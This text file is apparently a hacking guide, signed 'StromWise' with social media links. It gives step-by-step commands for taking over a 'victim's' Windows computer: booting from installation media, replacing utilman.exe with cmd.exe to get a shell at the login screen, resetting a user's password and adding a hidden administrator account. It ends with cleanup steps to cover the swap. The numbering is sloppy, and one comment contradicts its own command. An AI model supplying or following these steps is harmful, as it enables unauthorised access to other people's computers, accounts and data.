

STEP 1:-   enter the windows installation media
STEP 2:-   once you are windows setup screen 
STEP 3:-   press SHIFT + F10              (to open cmd on that screen)
STEP 4:-   wmic logicaldisk get name                (type this command to get all the drives on the system)
STEP 5:-   search all the drive by getting the specific drive one by one to check which one is the c: of the victims computer for that type
STEP 6:-   c:                    (hit enter) (to get into specific drive seach all drive one by one which you can see after the above command)
STEP 7:-   dir                      (hit enter) (to view the file in the drive)
STEP 8:-   then enter the drive                 (by just enter the "drive letter" and ":")which is the local disk C of the victimms system then type 
STEP 9:-   cd windows            (hit enter)
STEP 10:-   cd system32             (hit enter)
STEP 11:-   ren utilman.exe utilman.bak                       (hit enter)(renameing the utilman.exe to utilman2.exe)
STEP 12:-   copy cmd.exe utilman.exe                 (hit enter)
STEP 13:-   close the cmd
STEP 14:-   cancel the installation                     (yes)

remove the usb and let system boot into windows

STEP 15:-  click on ease of acces option on login screen
STEP 16:-  to change the password of the user type 
STEP 17:-  net user <username> <password>                 (type the user name which you want to bypass and the password you want to set nowfor that user)
STEP 18:-  hit enter                 (now you can enter the password you have set for the user to login)
STEP 19:-  BOOM 

IF YOU WANT TO CREATE A NEW USER WITH ADMIN PRIVELEDGES THEN :

STEP 20:-  net user newuser newpassword /add                (Replace "newuser" and "newpassword" with the username and password you want to use for the new account.)
STEP 21:-  net localgroup Administrators newuser /add                    (Type the following command to add the new user account to the local Administrators group:)


(Once you have logged in to the new user account, open Command Prompt with user-level privileges and type the following command to revert the changes you made earlier)
STEP 21:-  cd C:\Windows\System32
STEP 21:-  takeown /f utilman.bak               (Type the following command to take ownership of the utilman.bak file:)
STEP 21:-  icacls utilman.bak /grant administrators:F                   (Type the following command to grant yourself full control over the utilman.bak file:)
STEP 21:-  del utilman.exe                           (Type the following command to delete the cmd utilman.exe file:)
STEP 21:-  ren utilman.bak utilman.exe                  (Type the following command to rename the utilman.bak file back to utilman.exe:)











____________________________________________________________________________________________________________________________________________
▶ Name: StromWise

▶ Role: Creator

▶ Location: Unknown

▶ GitHub: https://github.com/stromwise 

▶ Instagram: https://www.instagram.com/stromwise/ 

▶ Facebook: https://www.facebook.com/profile.php?id=100093706328777

▶ Youtube: https://www.youtube.com/channel/UC-tafc0TqgZNnQio8Gj-hjg 

▶ Twitter: https://twitter.com/StromWise 
____________________________________________________________________________________________________________________________________________
